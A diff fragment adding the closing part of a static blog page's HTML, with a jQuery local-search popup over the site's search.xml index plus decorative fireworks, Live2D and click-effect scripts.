+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!-- ҳ����С���� -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
